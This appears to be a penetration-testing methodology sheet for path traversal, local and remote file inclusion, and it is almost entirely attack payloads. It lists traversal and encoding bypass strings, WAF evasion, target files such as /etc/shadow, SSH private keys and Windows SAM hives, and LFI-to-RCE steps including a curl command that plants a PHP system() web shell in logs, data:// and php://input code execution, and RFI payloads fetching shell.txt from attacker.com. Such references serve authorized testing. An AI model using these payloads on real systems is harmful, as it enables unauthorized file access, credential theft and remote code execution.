# Path Traversal Testing Methodology

## Quick Reference

**Basic Payloads:**
```
../../../etc/passwd
..\..\..\..\windows\win.ini
....//....//....//etc/passwd
..%2f..%2f..%2fetc/passwd
```

**Null Byte (older systems):**
```
../../../etc/passwd%00
../../../etc/passwd%00.png
```

---

## Path Traversal vs LFI vs RFI

### Path Traversal
Access files outside intended directory via `../` sequences.

### Local File Inclusion (LFI)
Include/execute local files, often through PHP `include()`.

### Remote File Inclusion (RFI)
Include files from remote URLs (requires specific configuration).

---

## Injection Patterns

### Pattern 1: Basic Directory Traversal

**Vulnerable code:** `readFile("/uploads/" + filename)`

**Payloads:**
```
../../../etc/passwd
..\..\..\..\windows\win.ini
....//....//etc/passwd
..../..../..../etc/passwd
```

### Pattern 2: Extension Appended

**Vulnerable code:** `readFile("/uploads/" + filename + ".txt")`

**Payloads:**
```
../../../etc/passwd%00          # Null byte (PHP < 5.3.4)
../../../etc/passwd%00.txt
../../../etc/passwd/.           # Truncation
../../../etc/passwd/./././...   # Long path truncation
```

### Pattern 3: Absolute Path Injection

**Vulnerable code:** `readFile(userInput)` (no base path)

**Payloads:**
```
/etc/passwd
C:\Windows\win.ini
file:///etc/passwd
```

### Pattern 4: URL-Based File Access

**Vulnerable code:** `fetch(url)` with file:// allowed

**Payloads:**
```
file:///etc/passwd
file://localhost/etc/passwd
```

---

## Bypass Techniques

### Encoding Bypasses

**URL Encoding:**
```
%2e%2e%2f = ../
%2e%2e/ = ../
..%2f = ../
%2e%2e%5c = ..\
```

**Double URL Encoding:**
```
%252e%252e%252f = ../
..%252f = ../
```

**16-bit Unicode Encoding:**
```
%u002e%u002e%u002f = ../
..%u2215 = ../
..%c0%af = ../  (overlong UTF-8)
```

**Overlong UTF-8:**
```
..%c0%af = ../
..%c1%9c = ../
%c0%ae%c0%ae%c0%af = ../
```

### Traversal Sequence Bypass

**If `../` is stripped:**
```
....//
..../
....\/
....\\
..;/
```

**If traversal blocked once:**
```
....//....//....//etc/passwd
....\/....\/....\/etc/passwd
```

**Mixed encoding:**
```
..%252f..%252f..%252fetc/passwd
..%c0%af..%c0%af..%c0%afetc/passwd
```

### Path Normalization Tricks

**Trailing characters:**
```
../../../etc/passwd/.
../../../etc/passwd/
../../../etc/passwd/./
```

**Path with null byte:**
```
../../../etc/passwd%00
../../../etc/passwd%00.jpg
```

### Case Sensitivity (Windows)

```
..\..\..\windows\win.ini
..\..\..\WINDOWS\win.ini
..\..\..\Windows\Win.Ini
```

### UNC Paths (Windows)

```
\\server\share\file
\\localhost\c$\windows\win.ini
```

---

## Target Files

### Unix/Linux

**System Files:**
```
/etc/passwd
/etc/shadow
/etc/group
/etc/hosts
/etc/hostname
/etc/resolv.conf
/etc/issue
/etc/motd
/etc/crontab
```

**User Files:**
```
/root/.bash_history
/root/.ssh/id_rsa
/root/.ssh/authorized_keys
/home/[user]/.bash_history
/home/[user]/.ssh/id_rsa
```

**Process Information:**
```
/proc/self/environ
/proc/self/cmdline
/proc/self/fd/0
/proc/version
/proc/net/tcp
/proc/net/arp
/proc/sched_debug
```

**Log Files:**
```
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/auth.log
/var/log/syslog
```

**Application Files:**
```
/var/www/html/index.php
/var/www/html/wp-config.php
/var/www/html/.htaccess
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
/etc/mysql/my.cnf
```

### Windows

**System Files:**
```
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\config\SECURITY
C:\Windows\repair\SAM
C:\Windows\repair\SYSTEM
```

**User Files:**
```
C:\Users\[user]\Desktop\
C:\Users\[user]\.ssh\id_rsa
C:\Users\[user]\AppData\Local\
```

**IIS:**
```
C:\inetpub\wwwroot\web.config
C:\inetpub\logs\LogFiles\
C:\Windows\System32\inetsrv\config\applicationHost.config
```

---

## LFI to RCE Techniques

### Log Poisoning

1. Inject PHP code into log:
```bash
curl -A "<?php system(\$_GET['cmd']); ?>" http://target/
```

2. Include the log:
```
../../../var/log/apache2/access.log&cmd=id
```

### /proc/self/environ Poisoning

1. Send malicious User-Agent
2. Include `/proc/self/environ`

### PHP Session Files

1. Store payload in session
2. Include session file:
```
../../../var/lib/php/sessions/sess_[SESSIONID]
../../../tmp/sess_[SESSIONID]
```

### PHP Wrappers

**php://filter - Read source code:**
```
php://filter/convert.base64-encode/resource=index.php
php://filter/read=string.rot13/resource=index.php
```

**php://input - Execute POST data:**
```
POST: <?php system('id'); ?>
Include: php://input
```

**data:// - Execute inline code:**
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
data://text/plain,<?php system('id'); ?>
```

**expect:// - Command execution:**
```
expect://id
```

**zip:// - Include from zip:**
```
zip://path/to/uploaded.zip%23shell.php
```

**phar:// - Deserialization:**
```
phar://path/to/uploaded.phar/file.txt
```

### Upload + Include

1. Upload file with PHP code (bypass extension check)
2. Include the uploaded file via LFI

---

## RFI Testing

**Requirements:** `allow_url_include=On` in PHP

**Payloads:**
```
http://attacker.com/shell.txt
http://attacker.com/shell.txt?
http://attacker.com/shell.txt%00
https://attacker.com/shell.txt
ftp://attacker.com/shell.txt
```

**Bypass null bytes:**
```
http://attacker.com/shell.txt?x=
http://attacker.com/shell.txt#
```

---

## Framework-Specific

### PHP

Vulnerable functions:
```php
include($file)
include_once($file)
require($file)
require_once($file)
file_get_contents($file)
fopen($file)
readfile($file)
file($file)
```

### Java

```java
new File(basePath + userInput)
FileInputStream(path)
new FileReader(path)
```

### Node.js

```javascript
fs.readFile(path)
fs.readFileSync(path)
require(path)  // Can be dangerous
```

### Python

```python
open(path)
os.path.join(base, user_input)  # Still vulnerable if input starts with /
```

---

## WAF Bypass Techniques

**Double encoding:**
```
%252e%252e%252f
```

**Mixed slashes:**
```
..\/..\/
../..\\
```

**Unicode variations:**
```
%u002e%u002e%u002f
%c0%ae%c0%ae%c0%af
```

**HPP (HTTP Parameter Pollution):**
```
?file=valid.txt&file=../../../etc/passwd
```

---

## Verification Checklist

1. **Identify file parameter:**
   - [ ] File download/view functionality
   - [ ] Template/theme selection
   - [ ] Include/import parameters

2. **Test basic traversal:**
   - [ ] `../../../etc/passwd`
   - [ ] `..\..\..\..\windows\win.ini`

3. **Apply bypass techniques:**
   - [ ] URL encoding
   - [ ] Double encoding
   - [ ] Null bytes
   - [ ] Traversal sequence variations

4. **Confirm file access:**
   - [ ] Retrieved known file content
   - [ ] Different responses for valid/invalid paths

5. **Test escalation:**
   - [ ] LFI to RCE via log poisoning
   - [ ] PHP wrappers
   - [ ] Sensitive file extraction

6. **Document evidence:**
   - [ ] File contents retrieved
   - [ ] Working payload
   - [ ] Affected endpoint and parameter
